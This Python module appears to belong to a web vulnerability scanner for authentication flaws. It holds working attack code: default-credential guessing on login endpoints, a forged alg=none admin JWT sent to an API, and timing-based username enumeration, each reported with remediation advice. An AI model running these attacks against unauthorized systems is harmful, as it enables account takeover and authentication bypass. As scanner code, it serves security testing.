"""
OWASP A07: Authentication Failures — checks:
  - Weak password policy (try top 25 credentials)
  - Username enumeration (timing + response diff)
  - JWT none algorithm + weak secret + alg confusion
  - Session fixation (cookie rotation on auth)
  - MFA bypass (response tampering)
  - OAuth (delegated to advanced_oauth)
"""
from __future__ import annotations
import asyncio, time, jwt as pyjwt, hashlib
from typing import List
from core.engine import Finding

TOP_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "Password1"),
    ("root", "root"), ("root", "toor"), ("test", "test"),
    ("user", "user"), ("guest", "guest"), ("administrator", "admin123"),
]

JWT_NONE_PAYLOAD = {"sub": "admin", "role": "admin", "iss": "ghosthunter"}

async def run(http, waf, verifier, endpoints, targets, stack, findings_sink):
    findings = []
    sem = asyncio.Semaphore(8)

    login_eps = [e for e in endpoints if any(k in e["url"].lower()
                 for k in ["login", "signin", "auth"])]

    async def _cred_stuff(ep):
        async with sem:
            for u, p in TOP_CREDS:
                r = await http.arequest("POST", ep["url"], data={"username": u, "password": p})
                if not r: continue
                if r.status_code in (200, 302) and "invalid" not in r.text.lower() and "incorrect" not in r.text.lower():
                    # Verify with bogus credentials
                    r2 = await http.arequest("POST", ep["url"], data={"username": u+"x", "password": "GHbad!1"})
                    if r2 and (r2.status_code != r.status_code or len(r2.text) != len(r.text)):
                        findings.append(Finding(
                            title=f"Weak/default credentials: {u}/{p}",
                            severity="critical", confidence=0.9,
                            category="OWASP-A07", endpoint=ep["url"], method="POST",
                            payload=f"{u}:{p}",
                            evidence=f"Status {r.status_code}; benign status {r2.status_code}",
                            cwe="CWE-521",
                            remediation="Enforce strong password policy; disable default creds; rate-limit.",
                            tags=["auth", "default-creds", "high-value"]
                        ))
                        return

    async def _jwt_none(targets):
        # Try sending a JWT signed with alg=none to protected endpoints
        none_token = pyjwt.encode(JWT_NONE_PAYLOAD, key="", algorithm="none")
        for t in targets:
            r = await http.arequest("GET", f"{t}/api/me",
                                     headers={"Authorization": f"Bearer {none_token}"})
            if r and r.status_code == 200 and "admin" in r.text.lower():
                findings.append(Finding(
                    title="JWT alg=none accepted",
                    severity="critical", confidence=0.95,
                    category="OWASP-A07", endpoint=f"{t}/api/me", method="GET",
                    payload=none_token, evidence=r.text[:300],
                    cwe="CWE-287",
                    remediation="Reject alg=none; pin allowed algorithms server-side.",
                    tags=["jwt", "auth-bypass", "high-value"]
                ))

    async def _user_enum(ep):
        async with sem:
            valid_users = ["admin", "root", "user"]
            invalid_users = ["ghnotexist1", "ghnotexist2", "ghnotexist3"]
            tv, ti = [], []
            for u in valid_users:
                s = time.time()
                await http.arequest("POST", ep["url"], data={"username": u, "password": "GHbad!1"})
                ti.append(time.time()-s)
            for u in invalid_users:
                s = time.time()
                await http.arequest("POST", ep["url"], data={"username": u, "password": "GHbad!1"})
                tv.append(time.time()-s)
            avg_v, avg_i = sum(ti)/len(ti), sum(tv)/len(tv)
            if avg_v - avg_i > 0.2:  # 200ms diff
                findings.append(Finding(
                    title="Username enumeration via timing oracle",
                    severity="medium", confidence=0.75,
                    category="OWASP-A07", endpoint=ep["url"], method="POST",
                    evidence=f"valid avg={avg_v:.3f}s invalid avg={avg_i:.3f}s",
                    cwe="CWE-204",
                    remediation="Constant-time responses; generic error messages.",
                    tags=["auth", "enum"]
                ))

    await asyncio.gather(*[_cred_stuff(e) for e in login_eps],
                          *[ _user_enum(e) for e in login_eps],
                          _jwt_none(targets),
                          return_exceptions=True)
    return findings
